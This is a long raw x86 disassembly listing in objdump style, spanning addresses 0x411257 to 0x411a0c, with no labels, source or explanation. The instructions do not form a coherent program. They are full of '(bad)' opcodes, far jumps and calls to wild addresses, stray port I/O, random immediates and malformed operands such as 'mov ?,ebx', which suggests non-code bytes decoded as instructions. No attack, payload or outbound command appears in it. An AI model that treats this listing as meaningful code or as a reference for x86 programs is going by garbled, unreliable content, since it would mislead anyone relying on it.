  411257:	shl    DWORD PTR [ebx-0x692ea303],0xfe
  41125e:	mov    bl,0xa0
  411260:	shr    BYTE PTR [esi],1
  411262:	jmp    0xc88cdd5d
  411267:	popf   
  411268:	push   ecx
  411269:	add    BYTE PTR [ebx],dh
  41126b:	and    BYTE PTR [esi-0x55837f4a],bl
  411271:	(bad)  
  411272:	pop    esp
  411273:	clc    
  411274:	inc    eax
  411275:	pop    edi
  411276:	shr    BYTE PTR [ecx],cl
  411278:	int3   
  411279:	fs imul esi,eax,0x1245c9d
  411280:	(bad)  
  411281:	jo     0x411271
  411283:	in     eax,0x9d
  411285:	cmp    edi,edi
  411287:	sbb    cl,dh
  411289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41128a:	xlat   BYTE PTR ds:[ebx]
  41128b:	mov    al,ds:0x579ecd4d
  411290:	sub    al,0x5d
  411292:	xor    ecx,DWORD PTR [ebx+esi*1-0x40]
  411296:	cmp    ah,BYTE PTR [ebp-0x508fcd7f]
  41129c:	sahf   
  41129d:	sar    DWORD PTR [eax+esi*1-0x4d0f9f89],1
  4112a4:	adc    al,0xe5
  4112a6:	push   eax
  4112a7:	aas    
  4112a8:	push   ds
  4112a9:	cmp    dl,al
  4112ab:	and    al,0x56
  4112ad:	inc    ebx
  4112ae:	sub    eax,0xb0dfe48c
  4112b3:	or     BYTE PTR [edx],0x42
  4112b6:	xchg   BYTE PTR [eax+0x14],ah
  4112b9:	push   ebp
  4112ba:	leave  
  4112bb:	cs sub eax,0xe97fbc08
  4112c1:	lods   eax,DWORD PTR ds:[esi]
  4112c2:	out    dx,al
  4112c3:	stos   BYTE PTR es:[edi],al
  4112c4:	sub    eax,ebp
  4112c6:	jge    0x411286
  4112c8:	jae    0x4112d8
  4112ca:	scas   al,BYTE PTR es:[edi]
  4112cb:	mov    al,ds:0xd9908171
  4112d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112d1:	push   esi
  4112d2:	imul   edx,esi,0x87e6d6ee
  4112d8:	jbe    0x41130a
  4112da:	in     eax,dx
  4112db:	pop    edx
  4112dc:	xchg   esi,eax
  4112dd:	js     0x411302
  4112df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112e0:	sub    al,0x42
  4112e2:	dec    esi
  4112e3:	push   esp
  4112e4:	xchg   edi,eax
  4112e5:	pop    edi
  4112e6:	sbb    eax,0xae99612f
  4112eb:	jnp    0x4112f1
  4112ed:	test   al,0xe0
  4112ef:	shr    BYTE PTR [ecx+ebp*1+0x4e5111ee],0x67
  4112f7:	dec    ebx
  4112f8:	in     al,dx
  4112f9:	jae    0x4112ca
  4112fb:	sahf   
  4112fc:	shl    DWORD PTR [ebx],cl
  4112fe:	or     edx,DWORD PTR [esi+edi*8+0x22]
  411302:	or     al,0x44
  411304:	les    edi,FWORD PTR [edx+0x22]
  411307:	clc    
  411308:	sub    ah,cl
  41130a:	mov    eax,ds:0x12a8fa7e
  41130f:	fadd   QWORD PTR [esp+esi*4+0x5f5f315f]
  411316:	stos   DWORD PTR es:[edi],eax
  411317:	mov    ds:0x651c62a9,al
  41131c:	(bad)  
  41131d:	sub    BYTE PTR [ecx-0x76b6a4e8],ah
  411323:	dec    ebp
  411324:	adc    esi,ebp
  411326:	push   cs
  411327:	adc    ebp,DWORD PTR [ecx+0x7]
  41132a:	das    
  41132b:	(bad)  
  41132d:	mov    ebx,0x1a546bff
  411332:	sbb    BYTE PTR [ecx],al
  411334:	jmp    0x4112e6
  411336:	cs sbb eax,0xfcee6dc7
  41133c:	xchg   edi,eax
  41133d:	(bad)  
  41133e:	retf   
  41133f:	mov    esp,0xa1393edb
  411344:	adc    ch,BYTE PTR [eax-0x6f]
  411347:	sahf   
  411348:	dec    ecx
  411349:	(bad)  
  41134a:	or     bl,bl
  41134c:	pop    esi
  41134d:	fcomp  QWORD PTR [esi]
  41134f:	mov    ds:0x9d6758f1,ax
  411355:	pusha  
  411356:	ret    
  411357:	out    0xfc,al
  411359:	pop    esi
  41135a:	fisttp WORD PTR [eax+0x3]
  41135d:	aam    0xd7
  41135f:	mov    bh,0x64
  411361:	mov    bh,0x10
  411363:	lds    edx,FWORD PTR [edx]
  411365:	and    DWORD PTR [edx-0x3d],edi
  411368:	int3   
  411369:	sub    al,bl
  41136b:	mov    al,ds:0xb705c30c
  411370:	mul    esp
  411372:	imul   ebp,DWORD PTR [ebp+0x51],0xffffff84
  411376:	rol    BYTE PTR [ebp+0x6afa0c5e],1
  41137c:	jnp    0x411388
  41137e:	pop    esi
  41137f:	mov    eax,ds:0x61eda8c6
  411384:	or     eax,DWORD PTR [esi-0x7ca15314]
  41138a:	inc    ebp
  41138b:	repnz addr16 dec ebx
  41138e:	popf   
  41138f:	out    0xb2,eax
  411391:	push   ecx
  411392:	retf   0x391
  411395:	mov    cl,0xee
  411397:	mov    eax,ds:0x18d7fcb5
  41139c:	push   esp
  41139d:	(bad)  
  41139e:	push   0xffffff9a
  4113a0:	push   ds
  4113a1:	or     eax,eax
  4113a3:	dec    BYTE PTR es:[ebp+edx*8-0x60]
  4113a8:	cmp    al,0x54
  4113aa:	stos   DWORD PTR es:[edi],eax
  4113ab:	lea    ecx,[eax]
  4113ad:	or     eax,0xc26a5a34
  4113b2:	inc    edi
  4113b3:	popa   
  4113b4:	ds jl  0x411392
  4113b7:	add    DWORD PTR [ebp+eiz*4+0x6b],esp
  4113bb:	pusha  
  4113bc:	cs popa 
  4113be:	fld1   
  4113c0:	jae    0x41136f
  4113c2:	mov    edx,0xeeb496ae
  4113c7:	rcl    dl,1
  4113c9:	inc    edx
  4113ca:	leave  
  4113cb:	ret    0x50a5
  4113ce:	jmp    0x4113a1
  4113d0:	jmp    0x7cef3bf8
  4113d5:	nop
  4113d6:	pushw  0x60f2
  4113da:	sub    DWORD PTR [ebp-0x2f29180c],edx
  4113e0:	scas   eax,DWORD PTR es:[edi]
  4113e1:	push   ebx
  4113e2:	out    dx,al
  4113e3:	inc    esi
  4113e4:	int    0x33
  4113e6:	cmc    
  4113e7:	jno    0x41144c
  4113e9:	sub    eax,0xc5eb8de5
  4113ee:	imul   esp,DWORD PTR [ecx],0x33
  4113f1:	push   ecx
  4113f2:	popa   
  4113f3:	daa    
  4113f4:	inc    ebp
  4113f5:	xchg   esi,ebp
  4113f7:	ins    BYTE PTR es:[edi],dx
  4113f8:	xchg   esi,eax
  4113f9:	ins    BYTE PTR es:[edi],dx
  4113fa:	pop    ebx
  4113fb:	fcomp  DWORD PTR [ebx+0x74a0c362]
  411401:	adc    ecx,DWORD PTR [eax]
  411403:	xchg   ebx,eax
  411404:	and    eax,0x5ed122c7
  411409:	adc    esp,esi
  41140b:	icebp  
  41140c:	call   0xf54747c3
  411411:	pusha  
  411412:	ficom  DWORD PTR [esi+0xa]
  411415:	dec    esp
  411416:	sbb    edx,edi
  411418:	test   DWORD PTR [ebp+ebp*8-0x39],0x12df51d3
  411420:	(bad)  
  411421:	(bad)  
  411422:	cmp    al,0x81
  411424:	add    bh,BYTE PTR [ebp+esi*2-0x5f]
  411428:	cmp    al,0x1c
  41142a:	inc    ebp
  41142b:	daa    
  41142c:	fwait
  41142d:	xor    dl,0x4a
  411430:	push   edx
  411431:	push   es
  411432:	dec    ecx
  411433:	xchg   ecx,eax
  411434:	pop    esi
  411435:	shl    DWORD PTR [ebx],0xf2
  411438:	inc    edi
  411439:	xlat   BYTE PTR ds:[ebx]
  41143a:	mov    eax,es:0x427e23c0
  411440:	and    dl,al
  411442:	scas   al,BYTE PTR es:[edi]
  411443:	dec    esi
  411444:	pop    esi
  411445:	and    ebx,DWORD PTR [eax]
  411447:	pop    esi
  411448:	stc    
  411449:	sub    esi,edx
  41144b:	scas   eax,DWORD PTR es:[edi]
  41144c:	jle    0x4114ad
  41144e:	add    ah,0xfb
  411451:	mov    DWORD PTR [edi-0x6666c2d1],eax
  411457:	xchg   edi,eax
  411458:	pop    esi
  411459:	mov    ecx,0x337ff1b0
  41145e:	pushf  
  41145f:	sbb    al,0x7c
  411461:	pusha  
  411462:	xor    BYTE PTR [ebp+0x17],ch
  411465:	xchg   esi,eax
  411466:	es aaa 
  411468:	and    BYTE PTR [edi],al
  41146a:	xchg   BYTE PTR [eax-0x158fc2a0],bh
  411470:	(bad)  
  411471:	dec    edi
  411472:	jg     0x411475
  411474:	pop    es
  411475:	retf   
  411476:	adc    BYTE PTR [ecx+0x5649757d],ah
  41147c:	rol    BYTE PTR [esp+edx*8-0x4],cl
  411480:	pop    ebx
  411481:	jns    0x4114b5
  411483:	sbb    BYTE PTR [esi],ah
  411485:	(bad)  
  411486:	ds sub ch,bl
  411489:	mov    ch,0xcd
  41148b:	mov    al,ds:0x25428030
  411490:	mov    esi,0x5b6a519f
  411495:	mov    ch,0x8
  411497:	popa   
  411498:	cmp    BYTE PTR [ecx-0x3eb507a4],dh
  41149e:	jl     0x4114ef
  4114a0:	aaa    
  4114a1:	pusha  
  4114a2:	pop    ss
  4114a3:	test   BYTE PTR [edx+0x6b],0x8f
  4114a7:	jecxz  0x411481
  4114a9:	pushf  
  4114aa:	mov    dl,0xb4
  4114ac:	pop    ebp
  4114ad:	dec    DWORD PTR ss:[esp+ebx*4-0x71937d47]
  4114b5:	add    BYTE PTR [esi-0x5c],0x85
  4114b9:	cdq    
  4114ba:	aad    0xd7
  4114bc:	test   al,0x70
  4114be:	xchg   BYTE PTR [ebp+0x39],cl
  4114c1:	imul   dh
  4114c3:	ins    DWORD PTR es:[edi],dx
  4114c4:	test   DWORD PTR [ebx+0x22530ad8],0xfeee2e97
  4114ce:	push   esi
  4114cf:	fstp   DWORD PTR [esi+0x77]
  4114d2:	or     al,0x0
  4114d4:	mov    WORD PTR [ebp+eiz*2-0x634b8c73],fs
  4114db:	mov    ?,ebx
  4114dd:	test   eax,0x2a5e28b5
  4114e2:	test   eax,0x6cd3a1c5
  4114e7:	mov    DWORD PTR [esi+0x1a],ebx
  4114ea:	jae    0x411549
  4114ec:	nop
  4114ed:	mov    BYTE PTR [ecx+eax*2+0x6b83f0ac],bl
  4114f4:	mov    eax,0xa7f6c443
  4114f9:	and    BYTE PTR [edi],ah
  4114fb:	in     al,0xfa
  4114fd:	mov    BYTE PTR [esi+0x300612db],0xb0
  411504:	sub    ebp,DWORD PTR [esi+ebp*8]
  411507:	shl    BYTE PTR [ecx-0x1d331f86],1
  41150d:	mov    esi,0x7e848f6e
  411512:	xchg   esi,eax
  411513:	and    al,0xda
  411515:	push   edx
  411516:	scas   eax,DWORD PTR es:[edi]
  411517:	popf   
  411518:	ins    DWORD PTR es:[edi],dx
  411519:	push   cs
  41151a:	and    al,0x51
  41151c:	in     al,dx
  41151d:	or     dh,ch
  41151f:	retf   
  411520:	xchg   edi,eax
  411521:	ret    
  411522:	xchg   ebx,eax
  411523:	retf   
  411524:	adc    al,0xb4
  411526:	sub    esi,DWORD PTR [ebx+0x6a]
  411529:	pusha  
  41152a:	pop    es
  41152b:	fdivr  st,st(0)
  41152d:	in     al,dx
  41152e:	imul   eax,DWORD PTR [edx],0x7bee9103
  411534:	inc    eax
  411535:	imul   edi,DWORD PTR [ebx+eiz*1-0x10],0xeea10d67
  41153d:	call   0xae02:0xd5db9cc9
  411544:	pop    esi
  411545:	mov    ebp,0xe6a82401
  41154a:	lds    ebp,FWORD PTR [eax-0x6b]
  41154d:	pusha  
  41154e:	daa    
  41154f:	ror    BYTE PTR [esi],0xf2
  411552:	fs inc edi
  411554:	xchg   esp,eax
  411555:	push   esi
  411556:	jg     0x4115c1
  411558:	fdiv   DWORD PTR [eax-0x561e5ea1]
  41155e:	scas   eax,DWORD PTR es:[edi]
  41155f:	mov    bh,0xe0
  411561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411562:	mov    esi,edx
  411564:	pop    esi
  411565:	push   es
  411566:	cld    
  411567:	jp     0x4115e3
  411569:	call   0x2768adc4
  41156e:	shl    DWORD PTR [eax+0x4a0ba47b],0xa8
  411575:	jbe    0x411562
  411577:	mov    ch,0x5e
  411579:	jns    0x41152a
  41157b:	sub    BYTE PTR [esi+eiz*4],0x9c
  41157f:	imul   ecx,edx,0xf6083163
  411585:	pusha  
  411586:	mov    esi,0xd44cb98e
  41158b:	jns    0x411597
  41158d:	pop    esi
  41158e:	out    dx,al
  41158f:	cmp    BYTE PTR [ebx+0x55],0xd8
  411593:	cwde   
  411594:	mov    dh,0xfe
  411596:	imul   ax,WORD PTR [ecx+eiz*2],0xa2de
  41159c:	lods   al,BYTE PTR ds:[esi]
  41159d:	sahf   
  41159e:	loop   0x411579
  4115a0:	test   edi,edi
  4115a2:	loopne 0x41158a
  4115a4:	pop    ebx
  4115a5:	push   ebx
  4115a6:	add    dh,BYTE PTR [ebx-0x4536f6d5]
  4115ac:	fdivrp st(3),st
  4115ae:	or     BYTE PTR [eax],cl
  4115b0:	mov    cl,0x60
  4115b2:	test   eax,0x6d77d6ea
  4115b7:	imul   esp,DWORD PTR [eax+0x5e9b4a4b],0xffffffd6
  4115be:	xor    al,0x98
  4115c0:	pop    ss
  4115c1:	cmp    eax,0x4319ff9f
  4115c6:	mov    edx,0xb81e5cdb
  4115cb:	sub    edi,DWORD PTR [edx]
  4115cd:	retf   
  4115ce:	xchg   BYTE PTR [edi],dh
  4115d0:	fcomp  QWORD PTR [edi-0x28]
  4115d3:	pop    edi
  4115d4:	pop    esi
  4115d5:	mov    al,ds:0xabb0ab4a
  4115da:	adc    ecx,DWORD PTR [ebx]
  4115dc:	mov    eax,ds:0xd2cbfb60
  4115e1:	fdiv   DWORD PTR [edi+0x13]
  4115e4:	das    
  4115e5:	push   cs
  4115e6:	lock loopne 0x411584
  4115e9:	jecxz  0x41157e
  4115eb:	and    DWORD PTR [edx],esi
  4115ed:	data16 mov ah,0x22
  4115f0:	js     0x4115c2
  4115f2:	mov    ds:0xbc61d6a1,al
  4115f7:	sbb    dh,BYTE PTR [ebx+edi*1+0x38]
  4115fb:	or     al,0x5e
  4115fd:	sbb    BYTE PTR [ebx+ecx*8-0x17ed48d5],dl
  411604:	std    
  411605:	inc    ecx
  411606:	ins    BYTE PTR es:[edi],dx
  411607:	xor    al,BYTE PTR [esi-0x5f]
  41160a:	dec    esp
  41160b:	(bad)  
  41160c:	jae    0x41165f
  41160e:	mov    ebx,0xb49f5e66
  411613:	inc    ebp
  411614:	ret    
  411615:	xor    BYTE PTR ds:0x1c611377,cl
  41161b:	or     al,0x3b
  41161d:	jl     0x4115a9
  41161f:	mov    dl,0xb5
  411621:	xlat   BYTE PTR ds:[ebx]
  411622:	jmp    0x41166c
  411624:	into   
  411625:	inc    eax
  411626:	cwde   
  411627:	inc    esp
  411628:	cdq    
  411629:	rcl    BYTE PTR [ebx+0x9],0xd1
  41162d:	inc    ecx
  41162e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411630:	add    DWORD PTR [ebx],esp
  411632:	add    dl,BYTE PTR [edx]
  411634:	int3   
  411635:	loopne 0x4115d7
  411637:	xchg   edi,eax
  411638:	mov    edx,edx
  41163a:	out    0x7e,al
  41163c:	pop    esi
  41163d:	or     ah,BYTE PTR [edi+0x5d]
  411640:	xchg   ebx,eax
  411641:	ror    BYTE PTR [eax+0x3b44d888],0x10
  411648:	mov    ebx,0x4e5f115b
  41164d:	popa   
  41164e:	dec    ecx
  41164f:	stos   BYTE PTR es:[edi],al
  411650:	xchg   edi,eax
  411651:	cmp    eax,0xbb5b2ce8
  411656:	imul   ecx,DWORD PTR [ecx+0x57],0x2339ce5e
  41165d:	cli    
  41165e:	std    
  41165f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411660:	inc    esp
  411661:	push   ss
  411662:	pop    ds
  411663:	xchg   esi,eax
  411664:	fsubr  QWORD PTR [edx+0x7e]
  411667:	mov    esp,0x6938d5e
  41166c:	push   cs
  41166d:	out    0xb7,al
  41166f:	xor    esi,ecx
  411671:	pop    ecx
  411672:	jmp    0x4116de
  411674:	lock and ebx,ebx
  411677:	out    0xd2,eax
  411679:	push   eax
  41167a:	lock pop ss
  41167c:	bound  ebp,QWORD PTR [esi-0x42372a01]
  411682:	cmp    al,0xc0
  411684:	fdivrp st(1),st
  411686:	mov    ah,0xf0
  411688:	outs   dx,BYTE PTR ds:[esi]
  411689:	pusha  
  41168a:	add    edi,edx
  41168c:	fcmovne st,st(0)
  41168e:	lods   al,BYTE PTR ds:[esi]
  41168f:	xchg   ebp,eax
  411690:	clc    
  411691:	mov    ebp,esi
  411693:	xchg   edx,eax
  411694:	das    
  411695:	xchg   ebx,eax
  411696:	pop    esp
  411697:	out    dx,eax
  411698:	jno    0x4116f2
  41169a:	test   al,0xa0
  41169c:	aaa    
  41169d:	sbb    eax,0x6172b774
  4116a2:	sub    bh,cl
  4116a4:	pop    esi
  4116a5:	call   0x7e774e7d
  4116aa:	ja     0x4116d5
  4116ac:	inc    esi
  4116ad:	popa   
  4116ae:	cmp    eax,0xd2e46e99
  4116b3:	xchg   esi,eax
  4116b4:	mov    eax,ds:0x1946ee13
  4116b9:	sub    eax,0xe6eb4003
  4116be:	int3   
  4116bf:	mov    al,ds:0xa91c4c06
  4116c4:	fs adc ebp,0x5e5e3578
  4116cb:	mov    eax,ds:0x98401241
  4116d0:	mov    ch,0xa6
  4116d2:	in     eax,dx
  4116d3:	jl     0x4116c5
  4116d5:	pusha  
  4116d6:	fninit 
  4116d8:	mov    ebx,ebx
  4116da:	(bad)  
  4116db:	out    dx,al
  4116dc:	fbstp  TBYTE PTR [ebx]
  4116de:	out    dx,al
  4116df:	int3   
  4116e0:	push   0xa642a0b0
  4116e5:	outs   dx,DWORD PTR ds:[esi]
  4116e6:	cmp    ch,ch
  4116e8:	adc    ebx,DWORD PTR [esi-0x57]
  4116eb:	or     al,0xed
  4116ed:	dec    BYTE PTR [eax+0x5400933e]
  4116f3:	stos   DWORD PTR es:[edi],eax
  4116f4:	adc    eax,ecx
  4116f6:	add    ah,BYTE PTR [edi-0x7519dab]
  4116fc:	add    eax,esi
  4116fe:	aad    0x61
  411700:	dec    esi
  411701:	fs gs popf 
  411704:	fidivr WORD PTR [ebx+0x3bc5fee2]
  41170a:	push   0xffffff92
  41170c:	fs ret 
  41170e:	pop    es
  41170f:	cmp    BYTE PTR [ebp+0x28f1a0e0],al
  411715:	push   esi
  411716:	push   0x6eb515aa
  41171b:	cmc    
  41171c:	into   
  41171d:	xchg   ebp,eax
  41171e:	dec    ebp
  41171f:	and    eax,0xdcee4b8f
  411724:	mov    ecx,eax
  411726:	push   ebp
  411727:	cli    
  411728:	inc    ecx
  411729:	pop    edi
  41172a:	pop    ebx
  41172b:	mov    al,ds:0x4f2a4d01
  411730:	push   ds
  411731:	loope  0x4116ba
  411733:	push   ebp
  411734:	xchg   edi,eax
  411735:	dec    eax
  411736:	les    edx,FWORD PTR es:[esi+0x5ed4c4cd]
  41173d:	loopne 0x4117a7
  41173f:	clc    
  411740:	sub    eax,0xefa0cdd3
  411745:	shl    DWORD PTR [esi+ebp*8+0x4b],cl
  411749:	outs   dx,BYTE PTR ds:[esi]
  41174a:	cs test eax,0xba4784f
  411750:	pop    esi
  411751:	ins    BYTE PTR es:[edi],dx
  411752:	xor    cl,BYTE PTR [ebp-0x5e8af194]
  411758:	dec    esp
  411759:	sub    esi,eax
  41175b:	push   edi
  41175c:	int3   
  41175d:	fsub   st(7),st
  41175f:	xor    edi,DWORD PTR [esi+0x51fae2a5]
  411765:	mov    al,cs:0x1b691eb3
  41176b:	in     al,0x31
  41176d:	inc    ecx
  41176e:	in     eax,dx
  41176f:	mov    al,ds:0x59de5ab3
  411774:	jno    0x4117cb
  411776:	rcr    DWORD PTR [esi],1
  411778:	pop    esi
  411779:	xchg   ecx,eax
  41177a:	sbb    bh,BYTE PTR [esi+ebp*1]
  41177d:	jb     0x41173b
  41177f:	add    DWORD PTR [edx],eax
  411781:	jge    0x4117ad
  411783:	mov    ?,WORD PTR [ebx+0x60]
  411786:	es jmp 0xa75e:0xf5a5d074
  41178e:	dec    ebp
  41178f:	shl    DWORD PTR [ebx-0xb],0xf
  411793:	aas    
  411794:	nop
  411795:	push   ecx
  411796:	push   esi
  411797:	and    al,0xaf
  411799:	dec    eax
  41179a:	out    dx,al
  41179b:	sar    BYTE PTR [ecx],1
  41179d:	mov    eax,0x3a6557
  4117a2:	adc    al,0x6d
  4117a4:	arpl   WORD PTR [ebx],bx
  4117a6:	(bad)  
  4117a7:	shr    BYTE PTR [ecx-0x6bcb35d8],0x52
  4117ae:	push   cs
  4117af:	or     DWORD PTR [ebx-0x39],esp
  4117b2:	cs inc edx
  4117b4:	or     al,0x99
  4117b6:	jmp    0x43ab7687
  4117bb:	add    esi,DWORD PTR [eax-0x5f]
  4117be:	pushf  
  4117bf:	mov    cl,0xd1
  4117c1:	pusha  
  4117c2:	sub    bh,BYTE PTR [ecx]
  4117c4:	dec    ebp
  4117c5:	in     al,0xf9
  4117c7:	rcr    BYTE PTR [eax+0x7c],1
  4117ca:	out    dx,al
  4117cb:	jg     0x411786
  4117cd:	adc    ebx,edx
  4117cf:	neg    BYTE PTR [ebp-0x31]
  4117d2:	(bad)  
  4117d3:	test   al,0xfe
  4117d5:	dec    edx
  4117d6:	ins    DWORD PTR es:[edi],dx
  4117d7:	push   ecx
  4117d8:	xor    al,0xb5
  4117da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117db:	or     eax,0xda81b07f
  4117e0:	pop    esi
  4117e1:	xor    bh,BYTE PTR [ebp-0x36]
  4117e4:	push   ebp
  4117e5:	mov    ebx,0x65e76008
  4117ea:	push   esp
  4117eb:	inc    esi
  4117ec:	fiadd  WORD PTR [eiz*2-0x7e83adcb]
  4117f3:	pop    ds
  4117f4:	pop    esi
  4117f5:	pushf  
  4117f6:	mov    ebp,0x91e87bf2
  4117fb:	mov    esp,0x56bf610a
  411800:	clc    
  411801:	fist   DWORD PTR [ecx]
  411803:	add    DWORD PTR [edx],0x5e65621b
  411809:	xor    BYTE PTR [edi+ebx*1-0x48],ah
  41180d:	and    al,0xf0
  41180f:	xor    DWORD PTR [ecx],ecx
  411811:	popa   
  411812:	and    ebp,eax
  411814:	fldenv ds:0x585fcec8
  41181a:	into   
  41181b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41181c:	jbe    0x411897
  41181e:	dec    eax
  41181f:	pop    eax
  411820:	jg     0x411864
  411822:	push   esp
  411823:	aad    0x71
  411825:	loopne 0x411868
  411827:	xchg   esp,eax
  411828:	mov    ebp,ebx
  41182a:	mov    ds:0xb6b55ef2,eax
  41182f:	(bad)  
  411831:	cs dec edx
  411833:	pop    edi
  411834:	retf   
  411835:	pusha  
  411836:	mov    edx,0x55528fe2
  41183b:	push   ds
  41183c:	(bad)  [ebp+0x2c31b5ee]
  411842:	repz push eax
  411844:	test   al,0x61
  411846:	ror    BYTE PTR [esi+0x2256c456],1
  41184c:	in     al,dx
  41184d:	jg     0x411807
  41184f:	dec    esp
  411850:	mov    DWORD PTR es:[esi],esi
  411853:	dec    edi
  411854:	pop    esi
  411855:	aad    0x9c
  411857:	pop    es
  411858:	js     0x4118a2
  41185a:	ret    
  41185b:	inc    ecx
  41185c:	fstp   DWORD PTR [ecx+ebp*4+0xe]
  411860:	mov    ch,BYTE PTR [edx-0x5264d7b5]
  411866:	mov    WORD PTR [ecx-0x1a],?
  411869:	adc    DWORD PTR ds:0x578f5ef9,ecx
  41186f:	sub    edx,ecx
  411871:	scas   al,BYTE PTR es:[edi]
  411872:	cmp    DWORD PTR [ebp-0x2c],ebp
  411875:	pusha  
  411876:	mov    edx,DWORD PTR [ecx-0x3f]
  411879:	push   edx
  41187a:	lahf   
  41187b:	and    DWORD PTR [esi-0x1c15117a],edi
  411881:	jbe    0x411891
  411883:	xchg   DWORD PTR [esi],eax
  411885:	je     0x411897
  411887:	ja     0x411817
  411889:	jae    0x411855
  41188b:	pop    esp
  41188c:	outs   dx,BYTE PTR ds:[esi]
  41188d:	call   0xe109:0xba6315f0
  411894:	adc    ebp,DWORD PTR [esi+0x45]
  411897:	(bad)  
  411899:	sub    al,0x6a
  41189b:	mul    BYTE PTR [esi+0x6ba0cec0]
  4118a1:	(bad)  
  4118a3:	test   cl,al
  4118a5:	dec    edi
  4118a6:	jo     0x41184d
  4118a8:	xor    esp,ebp
  4118aa:	mov    ds:0xf3422828,eax
  4118af:	femms  
  4118b1:	es xchg esp,eax
  4118b3:	(bad)  
  4118b4:	in     eax,0x60
  4118b6:	arpl   ax,sp
  4118b8:	scas   al,BYTE PTR es:[edi]
  4118b9:	dec    edi
  4118ba:	jno    0x411842
  4118bc:	stc    
  4118bd:	jns    0x4118b2
  4118bf:	or     al,BYTE PTR [ebx+eax*8-0x3e]
  4118c3:	mov    al,ds:0x53397bc8
  4118c8:	(bad)  
  4118c9:	pop    ecx
  4118ca:	inc    ecx
  4118cb:	push   ebp
  4118cc:	inc    eax
  4118cd:	mov    edi,0x4fc900ba
  4118d2:	mov    al,ds:0xc15c5bf8
  4118d7:	inc    edx
  4118d8:	out    dx,al
  4118d9:	inc    ebx
  4118da:	mov    esi,0x59f5a08e
  4118df:	mov    al,0x71
  4118e1:	pop    ds
  4118e2:	out    dx,al
  4118e3:	and    BYTE PTR [ecx],cl
  4118e5:	inc    ebp
  4118e6:	daa    
  4118e7:	inc    esp
  4118e8:	adc    DWORD PTR [eax+0x156d2ae7],esp
  4118ee:	in     al,dx
  4118ef:	pop    esi
  4118f0:	push   ds
  4118f1:	pushf  
  4118f2:	call   0xd9d:0x1b44a58b
  4118f9:	add    esp,esi
  4118fb:	pusha  
  4118fc:	or     cl,BYTE PTR [ebp+0x7e]
  4118ff:	test   eax,0xeeeeb457
  411904:	adc    DWORD PTR [edx+0x1fdb1337],esi
  41190a:	sub    DWORD PTR [ecx-0x5d6456fb],esp
  411910:	out    dx,al
  411911:	sub    al,0x28
  411913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411914:	into   
  411915:	mov    ds:0xf5e73fee,al
  41191a:	pop    esi
  41191b:	jmp    0x411992
  41191d:	mov    ds:0x52f26ec0,eax
  411922:	ds mov eax,0x5bc74227
  411928:	sbb    esi,DWORD PTR [ecx]
  41192a:	xor    DWORD PTR [ecx],esp
  41192c:	jbe    0x411918
  41192e:	into   
  41192f:	jnp    0x4119ad
  411931:	jbe    0x411957
  411933:	cwde   
  411934:	(bad)  
  411935:	pusha  
  411936:	pop    ebx
  411937:	test   eax,0x1cd5c3cb
  41193c:	jno    0x411982
  41193e:	out    dx,al
  41193f:	xor    BYTE PTR [edi-0x496b89fe],cl
  411945:	xor    BYTE PTR [eax-0x6238c55e],bl
  41194b:	test   edx,ebp
  41194d:	(bad)  
  41194e:	xchg   edx,eax
  41194f:	gs inc ecx
  411951:	jne    0x411940
  411953:	xlat   BYTE PTR ds:[ebx]
  411954:	add    BYTE PTR [ebx+0x34d1f029],bl
  41195a:	cmp    eax,0x466b6949
  41195f:	pop    edi
  411960:	fsub   QWORD PTR [eax+0x6c]
  411963:	xor    al,0x76
  411965:	ja     0x411940
  411967:	shr    BYTE PTR [ecx+0x73aa2532],1
  41196d:	ficomp WORD PTR [ebp-0x6d]
  411970:	sub    BYTE PTR [ebx+eiz*8],0x0
  411974:	in     al,0xa0
  411976:	out    dx,eax
  411977:	lea    ebp,[esi-0x4f1e5c52]
  41197d:	fbld   TBYTE PTR [eax]
  41197f:	aas    
  411980:	sub    BYTE PTR ds:0x46e594f0,al
  411986:	aaa    
  411987:	and    ecx,ebp
  411989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41198a:	push   0xfffffff5
  41198c:	in     al,0x61
  41198e:	adc    DWORD PTR [esi+ebx*2-0x2],ebx
  411992:	std    
  411993:	aam    0x1
  411995:	(bad)  
  411996:	shl    DWORD PTR [esi+0x5e],0xcd
  41199a:	iret   
  41199b:	mov    ds:0x6053b9b8,al
  4119a1:	popa   
  4119a2:	ret    0xff60
  4119a5:	call   0x7e53db0
  4119aa:	out    dx,al
  4119ab:	xchg   esp,eax
  4119ac:	ins    BYTE PTR es:[edi],dx
  4119ad:	push   esi
  4119ae:	loope  0x411a11
  4119b0:	es cmp eax,0xb150a12b
  4119b6:	and    BYTE PTR [ebx],bh
  4119b8:	and    bl,cl
  4119ba:	or     BYTE PTR [ecx+0x45fa465e],0xc6
  4119c1:	push   0xffffffb4
  4119c3:	popa   
  4119c4:	and    eax,0x6286cc52
  4119c9:	shr    DWORD PTR [esi],1
  4119cb:	not    DWORD PTR [ebp+eiz*2+0x1]
  4119cf:	cmp    ebx,DWORD PTR [esi+0x48]
  4119d2:	sub    DWORD PTR [ebp+0x4b],esi
  4119d5:	xor    BYTE PTR [eax+0x75eaf4a],bh
  4119db:	bound  esi,QWORD PTR [ebx]
  4119dd:	mov    cl,0xa3
  4119df:	(bad)  
  4119e0:	faddp  st(4),st
  4119e2:	out    dx,eax
  4119e3:	scas   al,BYTE PTR es:[edi]
  4119e4:	sub    esi,esi
  4119e6:	cmc    
  4119e7:	jb     0x4119df
  4119e9:	adc    bl,BYTE PTR [esi]
  4119eb:	and    DWORD PTR [edi],edx
  4119ed:	sbb    dl,BYTE PTR [ebx]
  4119ef:	jnp    0x4119d8
  4119f1:	test   al,0x50
  4119f3:	xchg   esp,eax
  4119f4:	pop    es
  4119f5:	xchg   esi,eax
  4119f6:	xchg   DWORD PTR [edi-0x7ed1826f],ebx
  4119fc:	rol    BYTE PTR [edi-0x52a18d29],0x7a
  411a03:	pop    es
  411a04:	mov    dl,0xdf
  411a06:	dec    ebx
  411a07:	mov    ds:0xf4c0b897,eax
  411a0c:	shl    DWORD PTR [eax+0x7e],cl
